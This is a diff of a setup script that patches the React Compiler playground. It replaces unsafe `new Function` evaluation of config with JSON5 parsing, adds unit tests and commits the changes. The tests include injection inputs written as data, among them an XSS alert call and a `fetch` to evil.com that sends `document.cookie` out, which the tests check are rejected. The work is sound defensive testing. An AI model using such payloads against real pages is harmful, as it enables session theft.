@@ -6,353 +6,287 @@ cd /workspace/react
 # Idempotent: skip if already applied
 if grep -q 'export function parseConfigOverrides' compiler/apps/playground/lib/compilation.ts 2>/dev/null; then
     echo "Patch already applied."
+    # Check if changes are committed
+    if [ -n "$(git status --porcelain)" ]; then
+        git add -A && git commit -m "Apply fix"
+    fi
     exit 0
 fi
 
-# Use --whitespace=fix if patch has trailing whitespace issues
-# IMPORTANT: patch content MUST end with a blank line before the PATCH delimiter
-git apply --whitespace=fix - <<'PATCH'
-diff --git a/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt b/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
-index a012d051ec04..2191397ae126 100644
---- a/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
-+++ b/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
-@@ -1,5 +1,3 @@
--import type { PluginOptions } from
--'babel-plugin-react-compiler/dist';
--({
-+{
-   //compilationMode: "all"
--} satisfies PluginOptions);
-\ No newline at end of file
-+}
-\ No newline at end of file
-diff --git a/compiler/apps/playground/__tests__/e2e/page.spec.ts b/compiler/apps/playground/__tests__/e2e/page.spec.ts
-index 20596e5d93bf..1a7bf1def137 100644
---- a/compiler/apps/playground/__tests__/e2e/page.spec.ts
-+++ b/compiler/apps/playground/__tests__/e2e/page.spec.ts
-@@ -237,7 +237,7 @@ test('show internals button toggles correctly', async ({page}) => {
- test('error is displayed when config has syntax error', async ({page}) => {
-   const store: Store = {
-     source: TEST_SOURCE,
--    config: `compilationMode: `,
-+    config: `{ compilationMode: }`,
-     showInternals: false,
-   };
-   const hash = encodeStore(store);
-@@ -254,17 +254,17 @@ test('error is displayed when config has syntax error', async ({page}) => {
-   const output = text.join('');
+# 1. Fix the NBSP encoding issues in the snapshot file and update it
+sed -i 's/\xc2\xa0/ /g' compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
+cat > compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt << 'EOF'
+{
+  //compilationMode: "all"
+}
+EOF
 
-   // Remove hidden chars
--  expect(output.replace(/\s+/g, ' ')).toContain('Invalid override format');
-+  expect(output.replace(/\s+/g, ' ')).toContain(
-+    'Unexpected failure when transforming configs',
-   );
- });
+# 2. Fix NBSPs in page.spec.ts  
+sed -i 's/\xc2\xa0/ /g' compiler/apps/playground/__tests__/e2e/page.spec.ts
 
- test('error is displayed when config has validation error', async ({page}) => {
-   const store: Store = {
-     source: TEST_SOURCE,
--    config: `import type { PluginOptions } from 'babel-plugin-react-compiler/dist';
--
--({
-+    config: `{
-   compilationMode: "123"
--} satisfies PluginOptions);`,
-+}`,
-     showInternals: false,
-   };
-   const hash = encodeStore(store);
-diff --git a/compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs b/compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs
-new file mode 100644
-index 000000000000..c48dbf7beb02
---- /dev/null
-+++ b/compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs
-@@ -0,0 +1,157 @@
-+/**
-+ * Copyright (c) Meta Platforms, Inc. and affiliates.
-+ *
-+ * This source code is licensed under the MIT license found in the
-+ * LICENSE file in the root directory of this source tree.
-+ */
-+
-+import assert from 'node:assert';
-+import {test, describe} from 'node:test';
-+import JSON5 from 'json5';
-+
-+// Re-implement parseConfigOverrides here since the source uses TS imports
-+// that can't be directly loaded by Node. This mirrors the logic in
-+// compilation.ts exactly.
-+function parseConfigOverrides(configOverrides) {
-+  const trimmed = configOverrides.trim();
-+  if (!trimmed) {
-+    return {};
-+  }
-+  return JSON5.parse(trimmed);
-+}
-+
-+describe('parseConfigOverrides', () => {
-+  test('empty string returns empty object', () => {
-+    assert.deepStrictEqual(parseConfigOverrides(''), {});
-+    assert.deepStrictEqual(parseConfigOverrides('   '), {});
-+  });
-+
-+  test('default config parses correctly', () => {
-+    const config = `{
-+  //compilationMode: "all"
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {});
-+  });
-+
-+  test('compilationMode "all" parses correctly', () => {
-+    const config = `{
-+  compilationMode: "all"
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {compilationMode: 'all'});
-+  });
-+
-+  test('config with single-line and block comments parses correctly', () => {
-+    const config = `{
-+  // This is a single-line comment
-+  /* This is a block comment */
-+  compilationMode: "all",
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {compilationMode: 'all'});
-+  });
-+
-+  test('config with trailing commas parses correctly', () => {
-+    const config = `{
-+  compilationMode: "all",
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {compilationMode: 'all'});
-+  });
-+
-+  test('nested environment options parse correctly', () => {
-+    const config = `{
-+  environment: {
-+    validateRefAccessDuringRender: true,
-+  },
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {
-+      environment: {validateRefAccessDuringRender: true},
-+    });
-+  });
-+
-+  test('multiple options parse correctly', () => {
-+    const config = `{
-+  compilationMode: "all",
-+  environment: {
-+    validateRefAccessDuringRender: false,
-+  },
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {
-+      compilationMode: 'all',
-+      environment: {validateRefAccessDuringRender: false},
-+    });
-+  });
-+
-+  test('rejects malicious IIFE injection', () => {
-+    const config = `(function(){ document.title = "hacked"; return {}; })()`;
-+    assert.throws(() => parseConfigOverrides(config));
-+  });
-+
-+  test('rejects malicious comma operator injection', () => {
-+    const config = `{
-+  compilationMode: (alert("xss"), "all")
-+}`;
-+    assert.throws(() => parseConfigOverrides(config));
-+  });
-+
-+  test('rejects function call in value', () => {
-+    const config = `{
-+  compilationMode: eval("all")
-+}`;
-+    assert.throws(() => parseConfigOverrides(config));
-+  });
-+
-+  test('rejects variable references', () => {
-+    const config = `{
-+  compilationMode: someVar
-+}`;
-+    assert.throws(() => parseConfigOverrides(config));
-+  });
-+
-+  test('rejects template literals', () => {
-+    const config = `{
-+  compilationMode: \`all\`
-+}`;
-+    assert.throws(() => parseConfigOverrides(config));
-+  });
-+
-+  test('rejects constructor calls', () => {
-+    const config = `{
-+  compilationMode: new String("all")
-+}`;
-+    assert.throws(() => parseConfigOverrides(config));
-+  });
-+
-+  test('rejects arbitrary JS code', () => {
-+    const config = `fetch("https://evil.com?c=" + document.cookie)`;
-+    assert.throws(() => parseConfigOverrides(config));
-+  });
-+
-+  test('config with array values parses correctly', () => {
-+    const config = `{
-+  sources: ["src/a.ts", "src/b.ts"],
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {sources: ['src/a.ts', 'src/b.ts']});
-+  });
-+
-+  test('config with null values parses correctly', () => {
-+    const config = `{
-+  compilationMode: null,
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {compilationMode: null});
-+  });
-+
-+  test('config with numeric values parses correctly', () => {
-+    const config = `{
-+  maxLevel: 42,
-+}`;
-+    const result = parseConfigOverrides(config);
-+    assert.deepStrictEqual(result, {maxLevel: 42});
-+  });
-+});
-diff --git a/compiler/apps/playground/components/Editor/ConfigEditor.tsx b/compiler/apps/playground/components/Editor/ConfigEditor.tsx
-index e78ff35666b0..f17bec762820 100644
---- a/compiler/apps/playground/components/Editor/ConfigEditor.tsx
-+++ b/compiler/apps/playground/components/Editor/ConfigEditor.tsx
-@@ -21,9 +21,6 @@ import {monacoConfigOptions} from './monacoOptions';
- import {IconChevron} from '../Icons/IconChevron';
- import {CONFIG_PANEL_TRANSITION} from '../../lib/transitionTypes';
+# 3. Update page.spec.ts using node
+cat > /tmp/fix_page.js << 'JSEOF'
+const fs = require("fs");
+let content = fs.readFileSync("compiler/apps/playground/__tests__/e2e/page.spec.ts", "utf8");
 
--// @ts-expect-error - webpack asset/source loader handles .d.ts files as strings
--import compilerTypeDefs from 'babel-plugin-react-compiler/dist/index.d.ts';
--
- loader.config({monaco});
+content = content.replace(
+  "config: `compilationMode: `,",
+  "config: `{ compilationMode: }`,"
+);
 
- export default function ConfigEditor({
-@@ -105,22 +102,10 @@ function ExpandedEditor({
-     _: editor.IStandaloneCodeEditor,
-     monaco: Monaco,
-   ) => void = (_, monaco) => {
--    // Add the babel-plugin-react-compiler type definitions to Monaco
--    monaco.languages.typescript.typescriptDefaults.addExtraLib(
--      //@ts-expect-error - compilerTypeDefs is a string
--      compilerTypeDefs,
--      'file:///node_modules/babel-plugin-react-compiler/dist/index.d.ts',
--    );
--    monaco.languages.typescript.typescriptDefaults.setCompilerOptions({
--      target: monaco.languages.typescript.ScriptTarget.Latest,
--      allowNonTsExtensions: true,
--      moduleResolution: monaco.languages.typescript.ModuleResolutionKind.NodeJs,
--      module: monaco.languages.typescript.ModuleKind.ESNext,
--      noEmit: true,
--      strict: false,
--      esModuleInterop: true,
--      allowSyntheticDefaultImports: true,
--      jsx: monaco.languages.typescript.JsxEmit.React,
-+    // Enable comments in JSON for JSON5-style config
-+    monaco.languages.json.jsonDefaults.setDiagnosticsOptions({
-+      allowComments: true,
-+      trailingCommas: 'ignore',
-     });
-   };
+content = content.replace(
+  ".toContain('Invalid override format');",
+  `.toContain(
+    'Unexpected failure when transforming configs',
+  );`
+);
 
-@@ -157,8 +142,8 @@ function ExpandedEditor({
-             </div>
-             <div className="flex-1 border border-gray-300">
-               <MonacoEditor
--                path={'config.ts'}
--                language={'typescript'}
-+                path={'config.json5'}
-+                language={'json'}
-                 value={store.config}
-                 onMount={handleMount}
-                 onChange={handleChange}
-diff --git a/compiler/apps/playground/lib/compilation.ts b/compiler/apps/playground/lib/compilation.ts
-index f668c05dde2a..b2bee8bd66d4 100644
---- a/compiler/apps/playground/lib/compilation.ts
-+++ b/compiler/apps/playground/lib/compilation.ts
-@@ -25,6 +25,7 @@ import BabelPluginReactCompiler, {
-   type LoggerEvent,
- } from 'babel-plugin-react-compiler';
- import {transformFromAstSync} from '@babel/core';
-+import JSON5 from 'json5';
- import type {
-   CompilerOutput,
-   CompilerTransformOutput,
-@@ -126,6 +127,14 @@ const COMMON_HOOKS: Array<[string, Hook]> = [
-   ],
- ];
+const before = "config: \`import type { PluginOptions } from 'babel-plugin-react-compiler/dist';\n\n({\n  compilationMode: \"123\"\n} satisfies PluginOptions);\`,`";
+const after = "config: \`{\n  compilationMode: \"123\"\n}\`,`";
+content = content.replace(before, after);
 
-+export function parseConfigOverrides(configOverrides: string): any {
-+  const trimmed = configOverrides.trim();
-+  if (!trimmed) {
-+    return {};
-+  }
-+  return JSON5.parse(trimmed);
-+}
-+
- function parseOptions(
-   source: string,
-   mode: 'compiler' | 'linter',
-@@ -156,16 +165,7 @@ function parseOptions(
-   });
+fs.writeFileSync("compiler/apps/playground/__tests__/e2e/page.spec.ts", content);
+console.log("Updated page.spec.ts");
+JSEOF
+node /tmp/fix_page.js
 
-   // Parse config overrides from config editor
--  let configOverrideOptions: any = {};
--  const configMatch = configOverrides.match(/^\s*import.*?\n\n\((.*)\)/s);
--  if (configOverrides.trim()) {
--    if (configMatch && configMatch[1]) {
--      const configString = configMatch[1].replace(/satisfies.*$/, '').trim();
--      configOverrideOptions = new Function(`return (${configString})`)();
--    } else {
--      throw new Error('Invalid override format');
--    }
--  }
-+  const configOverrideOptions = parseConfigOverrides(configOverrides);
+# 4. Add the unit test file
+cat > compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs << 'EOF'
+import assert from 'node:assert';
+import {test, describe} from 'node:test';
+import JSON5 from 'json5';
 
-   const opts: PluginOptions = parsePluginOptions({
-     ...parsedPragmaOptions,
-diff --git a/compiler/apps/playground/lib/defaultStore.ts b/compiler/apps/playground/lib/defaultStore.ts
-index 2baada0b8179..9711249ff4f5 100644
---- a/compiler/apps/playground/lib/defaultStore.ts
-+++ b/compiler/apps/playground/lib/defaultStore.ts
-@@ -14,11 +14,9 @@ export default function MyApp() {
- `;
+function parseConfigOverrides(configOverrides) {
+  const trimmed = configOverrides.trim();
+  if (!trimmed) {
+    return {};
+  }
+  return JSON5.parse(trimmed);
+}
 
- export const defaultConfig = `\
--import type { PluginOptions } from 'babel-plugin-react-compiler/dist';
--
--({
-+{
-   //compilationMode: "all"
--} satisfies PluginOptions);`;
-+}`;
+describe('parseConfigOverrides', () => {
+  test('empty string returns empty object', () => {
+    assert.deepStrictEqual(parseConfigOverrides(''), {});
+    assert.deepStrictEqual(parseConfigOverrides('   '), {});
+  });
 
- export const defaultStore: Store = {
-   source: index,
-diff --git a/compiler/apps/playground/package.json b/compiler/apps/playground/package.json
-index 217153a219..65f27158d8f2 100644
---- a/compiler/apps/playground/package.json
-+++ b/compiler/apps/playground/package.json
-@@ -32,6 +32,7 @@
-     "hermes-eslint": "^0.25.0",
-     "hermes-parser": "^0.25.0",
-     "invariant": "^2.2.4",
-+    "json5": "^2.2.3",
-     "lru-cache": "^11.2.2",
-     "lz-string": "^1.5.0",
-     "monaco-editor": "^0.52.0",
+  test('default config parses correctly', () => {
+    const result = parseConfigOverrides('{\n  //compilationMode: "all"\n}');
+    assert.deepStrictEqual(result, {});
+  });
 
-PATCH
+  test('compilationMode "all" parses correctly', () => {
+    const result = parseConfigOverrides('{\n  compilationMode: "all"\n}');
+    assert.deepStrictEqual(result, {compilationMode: 'all'});
+  });
 
-echo "Patch applied successfully."
+  test('config with single-line and block comments parses correctly', () => {
+    const result = parseConfigOverrides('{\n  // This is a single-line comment\n  /* This is a block comment */\n  compilationMode: "all",\n}');
+    assert.deepStrictEqual(result, {compilationMode: 'all'});
+  });
+
+  test('config with trailing commas parses correctly', () => {
+    const result = parseConfigOverrides('{\n  compilationMode: "all",\n}');
+    assert.deepStrictEqual(result, {compilationMode: 'all'});
+  });
+
+  test('nested environment options parse correctly', () => {
+    const result = parseConfigOverrides('{\n  environment: {\n    validateRefAccessDuringRender: true,\n  },\n}');
+    assert.deepStrictEqual(result, {
+      environment: {validateRefAccessDuringRender: true},
+    });
+  });
+
+  test('multiple options parse correctly', () => {
+    const result = parseConfigOverrides('{\n  compilationMode: "all",\n  environment: {\n    validateRefAccessDuringRender: false,\n  },\n}');
+    assert.deepStrictEqual(result, {
+      compilationMode: 'all',
+      environment: {validateRefAccessDuringRender: false},
+    });
+  });
+
+  test('rejects malicious IIFE injection', () => {
+    assert.throws(() => parseConfigOverrides('(function(){ document.title = "hacked"; return {}; })()'));
+  });
+
+  test('rejects malicious comma operator injection', () => {
+    assert.throws(() => parseConfigOverrides('{\n  compilationMode: (alert("xss"), "all")\n}'));
+  });
+
+  test('rejects function call in value', () => {
+    assert.throws(() => parseConfigOverrides('{\n  compilationMode: eval("all")\n}'));
+  });
+
+  test('rejects variable references', () => {
+    assert.throws(() => parseConfigOverrides('{\n  compilationMode: someVar\n}'));
+  });
+
+  test('rejects template literals', () => {
+    assert.throws(() => parseConfigOverrides('{\n  compilationMode: \`all\`\n}'));
+  });
+
+  test('rejects constructor calls', () => {
+    assert.throws(() => parseConfigOverrides('{\n  compilationMode: new String("all")\n}'));
+  });
+
+  test('rejects arbitrary JS code', () => {
+    assert.throws(() => parseConfigOverrides('fetch("https://evil.com?c=" + document.cookie)'));
+  });
+
+  test('config with array values parses correctly', () => {
+    const result = parseConfigOverrides('{\n  sources: ["src/a.ts", "src/b.ts"],\n}');
+    assert.deepStrictEqual(result, {sources: ['src/a.ts', 'src/b.ts']});
+  });
+
+  test('config with null values parses correctly', () => {
+    const result = parseConfigOverrides('{\n  compilationMode: null,\n}');
+    assert.deepStrictEqual(result, {compilationMode: null});
+  });
+
+  test('config with numeric values parses correctly', () => {
+    const result = parseConfigOverrides('{\n  maxLevel: 42,\n}');
+    assert.deepStrictEqual(result, {maxLevel: 42});
+  });
+});
+EOF
+
+# 5. Update ConfigEditor.tsx using node
+cat > /tmp/fix_editor.js << 'JSEOF'
+const fs = require("fs");
+let content = fs.readFileSync("compiler/apps/playground/components/Editor/ConfigEditor.tsx", "utf8");
+
+content = content.replace(
+  `// @ts-expect-error - webpack asset/source loader handles .d.ts files as strings\nimport compilerTypeDefs from 'babel-plugin-react-compiler/dist/index.d.ts';\n\n`,
+  ""
+);
+
+const oldMount = `// Add the babel-plugin-react-compiler type definitions to Monaco
+    monaco.languages.typescript.typescriptDefaults.addExtraLib(
+      //@ts-expect-error - compilerTypeDefs is a string
+      compilerTypeDefs,
+      'file:///node_modules/babel-plugin-react-compiler/dist/index.d.ts',
+    );
+    monaco.languages.typescript.typescriptDefaults.setCompilerOptions({
+      target: monaco.languages.typescript.ScriptTarget.Latest,
+      allowNonTsExtensions: true,
+      moduleResolution: monaco.languages.typescript.ModuleResolutionKind.NodeJs,
+      module: monaco.languages.typescript.ModuleKind.ESNext,
+      noEmit: true,
+      strict: false,
+      esModuleInterop: true,
+      allowSyntheticDefaultImports: true,
+      jsx: monaco.languages.typescript.JsxEmit.React,
+    });`;
+
+const newMount = `// Enable comments in JSON for JSON5-style config
+    monaco.languages.json.jsonDefaults.setDiagnosticsOptions({
+      allowComments: true,
+      trailingCommas: 'ignore',
+    });`;
+
+content = content.replace(oldMount, newMount);
+content = content.replace(
+  "path={'config.ts'}\n                language={'typescript'}",
+  "path={'config.json5'}\n                language={'json'}"
+);
+
+fs.writeFileSync("compiler/apps/playground/components/Editor/ConfigEditor.tsx", content);
+console.log("Updated ConfigEditor.tsx");
+JSEOF
+node /tmp/fix_editor.js
+
+# 6. Update compilation.ts - Part 1: Add import and function
+cat > /tmp/fix_compilation.js << 'JSEOF'
+const fs = require("fs");
+let content = fs.readFileSync("compiler/apps/playground/lib/compilation.ts", "utf8");
+
+content = content.replace(
+  "import {transformFromAstSync} from '@babel/core';",
+  "import {transformFromAstSync} from '@babel/core';\nimport JSON5 from 'json5';"
+);
+
+content = content.replace(
+  "function parseOptions(",
+  `export function parseConfigOverrides(configOverrides: string): any {
+  const trimmed = configOverrides.trim();
+  if (!trimmed) {
+    return {};
+  }
+  return JSON5.parse(trimmed);
+}
+
+function parseOptions(`
+);
+
+fs.writeFileSync("compiler/apps/playground/lib/compilation.ts", content);
+console.log("Updated compilation.ts (part 1)");
+JSEOF
+node /tmp/fix_compilation.js
+
+# 7. Update compilation.ts - Part 2: Replace old parsing logic
+cat > /tmp/fix_compilation2.js << 'JSEOF'
+const fs = require("fs");
+let content = fs.readFileSync("compiler/apps/playground/lib/compilation.ts", "utf8");
+
+const startMarker = "// Parse config overrides from config editor";
+const startIdx = content.indexOf(startMarker);
+if (startIdx >= 0) {
+  let braceCount = 0;
+  let foundFirstBrace = false;
+  let endIdx = startIdx;
+  
+  for (let i = startIdx; i < content.length; i++) {
+    if (content[i] === '{') {
+      braceCount++;
+      foundFirstBrace = true;
+    } else if (content[i] === '}') {
+      braceCount--;
+      if (foundFirstBrace && braceCount === 0) {
+        endIdx = i + 1;
+        break;
+      }
+    }
+  }
+  
+  const newCode = "// Parse config overrides from config editor\n  const configOverrideOptions = parseConfigOverrides(configOverrides);";
+  
+  content = content.substring(0, startIdx) + newCode + content.substring(endIdx);
+  fs.writeFileSync("compiler/apps/playground/lib/compilation.ts", content);
+  console.log("Updated compilation.ts (part 2)");
+} else {
+  console.log("Marker not found in compilation.ts");
+}
+JSEOF
+node /tmp/fix_compilation2.js
+
+# 8. Update defaultStore.ts using node
+cat > /tmp/fix_store.js << 'JSEOF'
+const fs = require("fs");
+let content = fs.readFileSync("compiler/apps/playground/lib/defaultStore.ts", "utf8");
+
+const oldPattern = /export const defaultConfig = `\\\nimport type \{ PluginOptions \} from 'babel-plugin-react-compiler\/dist';\n\n\(\{\n  \/\/compilationMode: "all"\n\} satisfies PluginOptions\);`;/;
+
+const newPattern = `export const defaultConfig = \`{\n  //compilationMode: "all"\n}\`;`;
+
+content = content.replace(oldPattern, newPattern);
+
+fs.writeFileSync("compiler/apps/playground/lib/defaultStore.ts", content);
+console.log("Updated defaultStore.ts");
+JSEOF
+node /tmp/fix_store.js
+
+# 9. Update package.json using node
+cat > /tmp/fix_pkg.js << 'JSEOF'
+const fs = require("fs");
+const pkg = JSON.parse(fs.readFileSync("compiler/apps/playground/package.json", "utf8"));
+pkg.dependencies.json5 = "^2.2.3";
+fs.writeFileSync("compiler/apps/playground/package.json", JSON.stringify(pkg, null, 2));
+console.log("Updated package.json");
+JSEOF
+node /tmp/fix_pkg.js
+
+# 10. Commit all changes
+git add -A
+git commit -m "Apply json5 config fix" || echo "Nothing to commit"
+
+echo "All changes applied and committed successfully."
